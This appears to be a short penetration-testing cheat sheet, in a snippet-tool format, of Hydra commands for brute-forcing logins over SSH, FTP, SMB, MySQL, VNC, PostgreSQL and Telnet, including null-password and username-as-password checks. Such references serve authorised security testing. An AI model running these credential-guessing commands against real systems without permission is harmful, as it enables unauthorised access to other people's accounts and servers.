# Hydra

% bruteforce, hydra

## Hydra - SSH - userlist and password list - 22
```
hydra -L <userlist> -P <passlist> <ip> ssh 
```

## Hydra - SSH - user and password  - 22
```
hydra -l <user|root> -p <password|root> <ip> ssh 
```

## Hydra - SSH - user=password - 22
```
hydra -L <userlist> -e s <ip> ssh 
```

## Hydra - SSH - null password - 22
```
hydra -l <user|root> -e n <ip> ssh 
```

## Hydra - SSH - password=reverseuser - 22
```
hydra -L <userlist> -e r <ip> ssh 
```

## Hydra - SSH - file "login:pass" format - 22
```
hydra -C <file_login_pass> <ip> ssh 
```

## Hydra - FTP - 21 
```
hydra -L <userlist> -P <passlist> <ip> ftp 
```

## Hydra - SMB - 445
```
hydra -L <userlist> -P <passlist> <ip> smb
```

## Hydra - MYSQL - 3306
```
hydra -L <userlist> -P <passlist> <ip> mysql 
```

## Hydra - VNC - 5900
```
hydra -L <userlist> -P <passlist> <ip> vnc 
```

## Hydra - PostgreSQL - 5432
```
hydra -L <userlist> -P <passlist> <ip> postgres
```

## Hydra - Telnet - 23
```
hydra -L <userlist> -P <passlist> <ip> telnet 
```

= userlist: users.txt
= passlist: pass.txt
